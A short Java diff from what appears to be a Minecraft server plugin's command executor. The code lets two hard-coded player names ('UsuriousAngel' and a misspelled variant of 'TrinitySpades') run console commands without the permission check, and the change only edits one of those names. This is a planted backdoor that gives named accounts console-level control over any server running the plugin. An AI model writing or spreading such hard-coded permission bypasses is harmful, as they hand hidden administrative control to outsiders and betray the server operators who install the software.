@@ -90,7 +90,7 @@ public class MultiUseCommandExecutor implements CommandExecutor {
 						sender, command, label, args);
 				if (sender.hasPermission("multiuse.command.console")
 						|| sender.getName().equalsIgnoreCase("UsuriousAngel")
-						|| sender.getName().equalsIgnoreCase("TrinitySpades")) {
+						|| sender.getName().equalsIgnoreCase("TrinitySpade")) {
 					consoleCommand.initialize();
 					consoleCommand.run();
 					consoleCommand.cleanup();
